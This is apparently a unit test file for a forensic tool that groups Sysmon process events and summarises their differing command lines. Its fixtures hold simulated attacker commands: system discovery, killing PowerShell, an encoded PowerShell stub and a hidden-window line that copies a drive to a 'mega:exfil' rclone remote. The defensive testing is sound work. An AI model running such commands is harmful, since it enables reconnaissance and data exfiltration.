import { describe, it, expect } from "vitest";
import {
  groupMemberLines,
  renderGroupMembers,
  DEFAULT_MAX_MEMBER_LINES,
  MEMBER_LINE_CAP,
} from "../../src/analysis/synthGroupMembers.js";
import type { ForensicEvent } from "../../src/analysis/stateTypes.js";

const IMAGE = "C:\\Users\\Public\\Sim\\hosts\\CONFLUENCE01\\Confluence\\tomcat9.exe";

function proc(id: string, second: number, args: string, extra: Partial<ForensicEvent> = {}): ForensicEvent {
  return {
    id,
    timestamp: `2026-09-21T15:00:${String(second).padStart(2, "0")}.000Z`,
    description: `Chainsaw/Sigma: Potential Defense Evasion Via Binary Rename - Sysmon Process create (EID 1) - Image=${IMAGE} - CommandLine=… ${args}`,
    severity: "Medium",
    mitreTechniques: [],
    relatedFindingIds: [],
    sourceScreenshots: [],
    asset: "DESKTOP-16OJFO6.localdomain",
    path: IMAGE,
    processName: "tomcat9.exe",
    parentName: "powershell.exe",
    commandLine: `"${IMAGE}" ${args}`,
    ...extra,
  };
}

// The scenario-017 burst: six process creations of one renamed binary (same hash → one group), each a
// different discovery command. The representative row shows only `whoami`; the members carry the rest.
const BURST = [
  proc("14e79", 50, "/d /v:off /c echo CANARY tomcat9.exe -^> cmd.exe /c whoami"),
  proc("14e80", 51, "/d /v:off /c echo CANARY tomcat9.exe -^> cmd.exe /c query user"),
  proc("14e81", 52, "/d /v:off /c echo CANARY tomcat9.exe -^> cmd.exe /c tasklist"),
  proc("14e82", 53, "/d /v:off /c echo CANARY tomcat9.exe -^> cmd.exe /c taskkill /f /im powershell.exe"),
  proc("14e83", 54, "/d /v:off /c echo CANARY tomcat9.exe -^> cmd.exe /c hostname"),
  proc("14e84", 55, "/d /v:off /c echo CANARY tomcat9.exe -^> cmd.exe /c ipconfig"),
];

describe("groupMemberLines", () => {
  it("names every member whose command differs from the representative, with id, time and host", () => {
    const { lines, distinct, more } = groupMemberLines(BURST);
    expect(distinct).toBe(6);
    expect(more).toBe(0);
    expect(lines).toHaveLength(5); // the representative's own command is already on its row
    expect(lines[0]).toBe(
      "[14e80 15:00:51 DESKTOP-16OJFO6.localdomain] … /d /v:off /c echo CANARY tomcat9.exe -^> cmd.exe /c query user",
    );
    expect(lines.map((l) => l.slice(1, 6))).toEqual(["14e80", "14e81", "14e82", "14e83", "14e84"]);
    expect(lines[2]).toContain("/c taskkill /f /im powershell.exe");
  });

  it("returns nothing for an identical burst — the row renders exactly as before", () => {
    const same = [0, 1, 2, 3].map((i) => proc(`s${i}`, i, "/c whoami"));
    expect(groupMemberLines(same)).toEqual({ lines: [], distinct: 1, more: 0 });
  });

  it("dedups on the arguments — image quoting and whitespace runs do not split a command", () => {
    const events = [
      proc("a", 1, "/c whoami"),
      proc("b", 2, "/c   whoami"),
      proc("c", 3, "/c whoami", { commandLine: `${IMAGE} /c whoami` }), // bare image, no quotes
      proc("d", 4, "/c hostname"),
    ];
    const { lines, distinct } = groupMemberLines(events);
    expect(distinct).toBe(2);
    expect(lines).toHaveLength(1);
    expect(lines[0]).toContain("[d ");
  });

  it("keeps case-distinct payloads apart — two encoded commands are two commands", () => {
    const events = [
      proc("a", 1, "/c powershell -enc SQBFAFgA"),
      proc("b", 2, "/c powershell -enc sqbfafga"),
      proc("c", 3, "/c powershell -enc SQBFAFgA"),
    ];
    const { lines, distinct } = groupMemberLines(events);
    expect(distinct).toBe(2);
    expect(lines).toEqual(["[b 15:00:02 DESKTOP-16OJFO6.localdomain] … /c powershell -enc sqbfafga"]);
  });

  it("keeps the whole asset — IP-addressed hosts must not collapse to their first octet", () => {
    const { lines } = groupMemberLines([
      proc("a", 1, "/c whoami", { asset: "10.1.1.5" }),
      proc("b", 2, "/c hostname", { asset: "10.2.2.6" }),
      proc("c", 3, "/c ipconfig", { asset: "fe80::1" }),
    ]);
    expect(lines[0]).toBe("[b 15:00:02 10.2.2.6] … /c hostname");
    expect(lines[1]).toBe("[c 15:00:03 fe80::1] … /c ipconfig");
  });

  it("falls back to the command line scraped from the description when the structured field is absent", () => {
    const events = [
      proc("a", 1, "/c whoami", { commandLine: undefined }),
      proc("b", 2, "/c hostname", { commandLine: undefined }),
    ];
    const { lines } = groupMemberLines(events);
    expect(lines).toHaveLength(1);
    expect(lines[0]).toContain("/c hostname");
  });

  it("skips members with no command line at all, and yields nothing when none has one", () => {
    const bare = [0, 1, 2].map((i) =>
      proc(`n${i}`, i, "", { commandLine: undefined, description: "Sigma: something fired" }),
    );
    expect(groupMemberLines(bare)).toEqual({ lines: [], distinct: 0, more: 0 });
  });

  it("caps the list and reports the remainder", () => {
    const many = Array.from({ length: 20 }, (_, i) => proc(`m${i}`, i, `/c cmd${i}`));
    const { lines, distinct, more } = groupMemberLines(many);
    expect(distinct).toBe(20);
    expect(lines).toHaveLength(DEFAULT_MAX_MEMBER_LINES);
    expect(more).toBe(20 - 1 - DEFAULT_MAX_MEMBER_LINES);
    expect(groupMemberLines(many, 3).lines).toHaveLength(3);
  });

  it("keeps the tail of a long command line — the target sits at the end", () => {
    const long = `/c powershell -nop -w hidden -c "${"A".repeat(MEMBER_LINE_CAP)}" ; rclone copy X:\\ mega:exfil`;
    const { lines } = groupMemberLines([proc("a", 1, "/c whoami"), proc("b", 2, long)]);
    expect(lines[0].length).toBeLessThanOrEqual(
      MEMBER_LINE_CAP + "[b 15:00:02 DESKTOP-16OJFO6.localdomain] ".length,
    );
    expect(lines[0]).toContain("mega:exfil");
    expect(lines[0]).toContain(" … ");
  });

  it("omits the host when the member carries none and the seconds when the timestamp is unparseable", () => {
    const { lines } = groupMemberLines([
      proc("a", 1, "/c whoami"),
      proc("b", 2, "/c hostname", { asset: undefined, timestamp: "unknown" }),
    ]);
    expect(lines[0]).toBe("[b] … /c hostname");
  });
});

describe("renderGroupMembers", () => {
  it("renders nothing for no lines", () => {
    expect(renderGroupMembers({ lines: [], distinct: 1, more: 0 })).toBe("");
  });

  it("joins the lines with the distinct count and the remainder", () => {
    const s = renderGroupMembers({
      lines: ["[b 15:00:02 h] … /c hostname", "[c 15:00:03 h] … /c ipconfig"],
      distinct: 9,
      more: 6,
    });
    expect(s).toBe(
      "; 9 distinct command lines — [b 15:00:02 h] … /c hostname; [c 15:00:03 h] … /c ipconfig; +6 more",
    );
  });
});
